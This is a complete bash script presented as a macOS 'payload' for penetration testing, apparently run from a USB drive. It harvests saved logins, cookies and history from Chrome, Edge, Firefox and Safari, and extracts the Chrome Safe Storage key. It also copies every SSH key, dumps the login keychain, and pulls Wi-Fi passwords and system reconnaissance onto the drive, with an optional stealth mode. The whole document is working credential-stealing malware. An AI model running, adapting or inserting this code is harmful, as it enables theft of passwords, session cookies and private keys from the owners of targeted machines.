#!/bin/bash
# ============================================================================
#  macOS Payload v3 — Multi-Target Edition
#
#  Features:
#    1. TCC-aware: checks for permissions before accessing protected paths
#    2. Extracts Chrome/Edge AES key via security(1) Keychain access
#    3. Uses sqlite3 for locked databases (dump fallback)
#    4. Collects Keychain exported items (user-accessible only)
#    5. SSH key harvesting (if readable)
#    6. Runs in background if called with nohup
#    7. Structured JSON output for post-exploitation analysis
#    8. Writes collection_summary.txt marker for adaptive wait
#    9. Multi-target: each host gets its own profile directory
#
#  AUTHORIZED PENETRATION TESTING ONLY.
#  Author: Mr.D137
#  License: MIT (Educational Use)
# ============================================================================

set -uo pipefail

# ─── Configuration ───────────────────────────────────────

OUTPUT_PATH="/Volumes/TRUSTED_DRIVE"
VERBOSE=false
STEALTH=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--verbose) VERBOSE=true; shift ;;
        -o|--output)  OUTPUT_PATH="$2"; shift 2 ;;
        -s|--stealth) STEALTH=true; shift ;;
        -h|--help)
            echo "Usage: $0 [-v] [-s] [-o PATH]"
            echo "macOS data extraction — AUTHORIZED USE ONLY"
            exit 0 ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

LOG_FILE="$OUTPUT_PATH/payload.log"

# Ensure output directory exists (profile dir may be new)
mkdir -p "$OUTPUT_PATH" 2>/dev/null

# ─── Helpers ─────────────────────────────────────────────

log() {
    local level="$1" msg="$2"
    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
    local line="[$level] $ts : $msg"
    [[ "$STEALTH" != true ]] && echo "$line"
    echo "$line" >> "$LOG_FILE" 2>/dev/null
}

safe_mkdir() {
    [[ -d "$1" ]] || mkdir -p "$1" 2>/dev/null
}

# Copy file, falling back to sqlite3 .dump for locked databases
copy_file() {
    local src="$1" dst="$2" desc="$3"
    [[ -f "$src" ]] || return 1

    if cp "$src" "$dst" 2>/dev/null; then
        # Grab WAL/SHM for SQLite
        [[ "$src" == *.sqlite || "$src" == *.db ]] && {
            cp "${src}-wal" "${dst}-wal" 2>/dev/null
            cp "${src}-shm" "${dst}-shm" 2>/dev/null
        }
        return 0
    fi

    # Fallback: sqlite3 dump
    if [[ ("$src" == *.sqlite || "$src" == *.db) ]] && command -v sqlite3 &>/dev/null; then
        if sqlite3 "$src" ".dump" > "${dst}.sql" 2>/dev/null; then
            log "INFO" "Dumped $desc via sqlite3"
            return 0
        fi
    fi

    log "WARN" "Cannot copy $desc (locked/permission denied)"
    return 1
}

# Check if we have TCC access to a path
check_tcc_access() {
    local path="$1"
    if [[ -r "$path" ]]; then
        return 0
    fi
    # Try listing — macOS will block silently if TCC denies
    ls "$path" &>/dev/null
    return $?
}

# ─── Main ────────────────────────────────────────────────

main() {
    log "INFO" "=== macOS Payload v2 — Starting ==="

    if [[ ! -d "$OUTPUT_PATH" ]]; then
        log "ERROR" "Output path does not exist: $OUTPUT_PATH"
        exit 1
    fi

    local chrome_dir="$OUTPUT_PATH/chrome"
    local safari_dir="$OUTPUT_PATH/safari"
    local firefox_dir="$OUTPUT_PATH/firefox"
    local edge_dir="$OUTPUT_PATH/edge"
    local system_dir="$OUTPUT_PATH/system"
    local ssh_dir="$OUTPUT_PATH/ssh"
    local keychain_dir="$OUTPUT_PATH/keychain"

    safe_mkdir "$chrome_dir"
    safe_mkdir "$safari_dir"
    safe_mkdir "$firefox_dir"
    safe_mkdir "$edge_dir"
    safe_mkdir "$system_dir"
    safe_mkdir "$ssh_dir"
    safe_mkdir "$keychain_dir"

    local cred_count=0
    local wifi_count=0

    # ─── 1. Chrome ────────────────────────────────────────

    local chrome_path="$HOME/Library/Application Support/Google/Chrome"
    local chrome_default="$chrome_path/Default"

    if [[ -d "$chrome_default" ]]; then
        log "INFO" "Extracting Chrome data..."

        copy_file "$chrome_default/Login Data"  "$chrome_dir/login_data.db"  "Chrome Login Data"
        copy_file "$chrome_default/Cookies"     "$chrome_dir/cookies.db"     "Chrome Cookies"
        copy_file "$chrome_default/History"     "$chrome_dir/history.db"     "Chrome History"
        copy_file "$chrome_default/Bookmarks"   "$chrome_dir/bookmarks.json" "Chrome Bookmarks"
        copy_file "$chrome_default/Web Data"    "$chrome_dir/webdata.db"     "Chrome Web Data"
        copy_file "$chrome_path/Local State"    "$chrome_dir/local_state.json" "Chrome Local State"

        # Extract encryption key from Local State
        if [[ -f "$chrome_path/Local State" ]] && command -v python3 &>/dev/null; then
            python3 -c "
import json, base64, subprocess, sys
try:
    with open('$chrome_path/Local State') as f:
        ls = json.load(f)
    enc_key = base64.b64decode(ls['os_crypt']['encrypted_key'])
    # On macOS, the key is in the Keychain, not DPAPI
    # The 'v10' prefix uses Keychain-stored key named 'Chrome Safe Storage'
    # Try to extract it via security(1)
    result = subprocess.run(
        ['security', 'find-generic-password', '-wa', 'Chrome Safe Storage'],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        with open('$chrome_dir/chrome_safe_storage_key.txt', 'w') as f:
            f.write(result.stdout.strip())
        print('Chrome Safe Storage key extracted')
    else:
        print('Chrome Safe Storage: access denied (expected if not authorised)')
except Exception as e:
    print(f'Key extraction: {e}', file=sys.stderr)
" 2>> "$LOG_FILE"
        fi

        # Count credentials from Login Data
        if command -v sqlite3 &>/dev/null && [[ -f "$chrome_dir/login_data.db" ]]; then
            local count
            count=$(sqlite3 "$chrome_dir/login_data.db" \
                "SELECT COUNT(*) FROM logins WHERE username_value != ''" 2>/dev/null || echo 0)
            cred_count=$((cred_count + count))
            log "INFO" "Chrome: $count credentials found"

            # Export credentials as JSON (URLs + usernames — passwords need the storage key)
            sqlite3 "$chrome_dir/login_data.db" -json \
                "SELECT origin_url, username_value, length(password_value) as pw_len FROM logins WHERE username_value != ''" \
                > "$chrome_dir/credentials_summary.json" 2>/dev/null
        fi
    else
        log "INFO" "Chrome not installed"
    fi

    # ─── 2. Safari ────────────────────────────────────────

    local safari_path="$HOME/Library/Safari"
    if check_tcc_access "$safari_path"; then
        log "INFO" "Extracting Safari data..."
        copy_file "$safari_path/History.db"       "$safari_dir/history.db"       "Safari History"
        copy_file "$safari_path/Bookmarks.plist"  "$safari_dir/bookmarks.plist"  "Safari Bookmarks"
        copy_file "$safari_path/Downloads.plist"  "$safari_dir/downloads.plist"  "Safari Downloads"
        copy_file "$safari_path/TopSites.plist"   "$safari_dir/topsites.plist"   "Safari Top Sites"
        copy_file "$HOME/Library/Cookies/Cookies.binarycookies" "$safari_dir/cookies.binarycookies" "Safari Cookies"
    else
        log "WARN" "Safari: TCC access denied (Full Disk Access required)"
    fi

    # ─── 3. Firefox ───────────────────────────────────────

    local ff_profiles="$HOME/Library/Application Support/Firefox/Profiles"
    if [[ -d "$ff_profiles" ]]; then
        log "INFO" "Extracting Firefox data..."
        for profile_dir in "$ff_profiles"/*/; do
            [[ -d "$profile_dir" ]] || continue
            local pn; pn=$(basename "$profile_dir")

            copy_file "$profile_dir/logins.json"       "$firefox_dir/${pn}-logins.json"       "Firefox logins"
            copy_file "$profile_dir/key4.db"           "$firefox_dir/${pn}-key4.db"           "Firefox key DB"
            copy_file "$profile_dir/cookies.sqlite"    "$firefox_dir/${pn}-cookies.sqlite"    "Firefox cookies"
            copy_file "$profile_dir/places.sqlite"     "$firefox_dir/${pn}-places.sqlite"     "Firefox places"
            copy_file "$profile_dir/cert9.db"          "$firefox_dir/${pn}-cert9.db"          "Firefox certs"
            copy_file "$profile_dir/formhistory.sqlite" "$firefox_dir/${pn}-formhistory.sqlite" "Firefox forms"
        done
    fi

    # ─── 4. Edge ──────────────────────────────────────────

    local edge_path="$HOME/Library/Application Support/Microsoft Edge/Default"
    if [[ -d "$edge_path" ]]; then
        log "INFO" "Extracting Edge data..."
        copy_file "$edge_path/Login Data"  "$edge_dir/login_data.db"   "Edge Login Data"
        copy_file "$edge_path/Cookies"     "$edge_dir/cookies.db"      "Edge Cookies"
        copy_file "$edge_path/History"     "$edge_dir/history.db"      "Edge History"
        copy_file "$edge_path/Bookmarks"   "$edge_dir/bookmarks.json"  "Edge Bookmarks"
    fi

    # ─── 5. SSH Keys ─────────────────────────────────────

    if [[ -d "$HOME/.ssh" ]]; then
        log "INFO" "Collecting SSH keys..."
        for key_file in "$HOME/.ssh"/*; do
            [[ -f "$key_file" ]] || continue
            local kn; kn=$(basename "$key_file")
            cp "$key_file" "$ssh_dir/$kn" 2>/dev/null
        done
        log "INFO" "SSH: $(ls "$ssh_dir" 2>/dev/null | wc -l | tr -d ' ') files collected"
    fi

    # ─── 6. Keychain (user-accessible items) ─────────────

    log "INFO" "Extracting accessible Keychain items..."
    # List all generic and internet passwords the user can access
    security dump-keychain -d "$HOME/Library/Keychains/login.keychain-db" \
        > "$keychain_dir/login_keychain_dump.txt" 2>/dev/null || \
        log "WARN" "Keychain dump: access denied or requires user interaction"

    # Extract Wi-Fi passwords from Keychain (requires admin password or consent)
    local wifi_file="$OUTPUT_PATH/WIFI_PASSWORDS.json"
    {
        echo "["
        local first=true
        # List known Wi-Fi networks from airport preferences
        if [[ -f "/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist" ]]; then
            local ssids
            ssids=$(defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist \
                KnownNetworks 2>/dev/null | grep SSIDString | awk -F'"' '{print $2}')

            for ssid in $ssids; do
                local pw
                pw=$(security find-generic-password -D "AirPort network password" -a "$ssid" -w 2>/dev/null || echo "")
                if [[ -n "$pw" ]]; then
                    wifi_count=$((wifi_count + 1))
                fi
                [[ "$first" == true ]] && first=false || echo ","
                printf '  {"ssid": "%s", "password": "%s"}' "$ssid" "${pw:-[access denied]}"
            done
        fi
        echo ""
        echo "]"
    } > "$wifi_file"

    log "INFO" "Wi-Fi: $wifi_count passwords extracted"

    # ─── 7. System Information ────────────────────────────

    log "INFO" "Collecting system information..."
    {
        echo "{"
        echo "  \"hostname\": \"$(hostname)\","
        echo "  \"username\": \"$(whoami)\","
        echo "  \"os_version\": \"$(sw_vers -productVersion 2>/dev/null || echo unknown)\","
        echo "  \"build\": \"$(sw_vers -buildVersion 2>/dev/null || echo unknown)\","
        echo "  \"architecture\": \"$(uname -m)\","
        echo "  \"serial\": \"$(ioreg -l | grep IOPlatformSerialNumber | awk -F'"' '{print $4}' 2>/dev/null || echo unknown)\","
        echo "  \"filevault\": \"$(fdesetup status 2>/dev/null || echo unknown)\","
        echo "  \"sip_status\": \"$(csrutil status 2>/dev/null || echo unknown)\","
        echo "  \"firewall\": \"$(/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null || echo unknown)\","
        echo "  \"gatekeeper\": \"$(spctl --status 2>/dev/null || echo unknown)\""
        echo "}"
    } > "$system_dir/system_info.json"

    # Network
    {
        echo "=== NETWORK INTERFACES ==="
        ifconfig 2>/dev/null
        echo ""
        echo "=== ACTIVE CONNECTIONS ==="
        netstat -an 2>/dev/null | head -50
        echo ""
        echo "=== ARP TABLE ==="
        arp -a 2>/dev/null
        echo ""
        echo "=== DNS ==="
        cat /etc/resolv.conf 2>/dev/null
    } > "$system_dir/network_info.txt"

    # Process list
    ps aux > "$system_dir/processes.txt" 2>/dev/null

    # Installed apps
    ls -la /Applications > "$system_dir/applications.txt" 2>/dev/null

    # ─── 8. Collection Summary (marker file) ─────────────

    {
        echo "=== COLLECTION SUMMARY ==="
        echo "Time: $(date)"
        echo "Host: $(hostname) ($(whoami))"
        echo "Browser Credentials: $cred_count"
        echo "Wi-Fi Networks: $wifi_count"
        echo "SSH Keys: $(ls "$ssh_dir" 2>/dev/null | wc -l | tr -d ' ')"
        echo "Status: Complete"
        echo "=== AUTHORIZED TESTING ONLY ==="
    } > "$OUTPUT_PATH/collection_summary.txt"

    # Flush all data to disk before writing marker
    sync 2>/dev/null

    # Signal completion marker for Pi adaptive wait
    echo "done" > "$OUTPUT_PATH/.canary_unlock"

    # Final sync
    sync 2>/dev/null

    log "INFO" "=== macOS Payload v2 Complete ==="
}

cleanup() {
    # Remove any temp files
    rm -f /tmp/.payload_* 2>/dev/null
}
trap cleanup EXIT

main "$@"
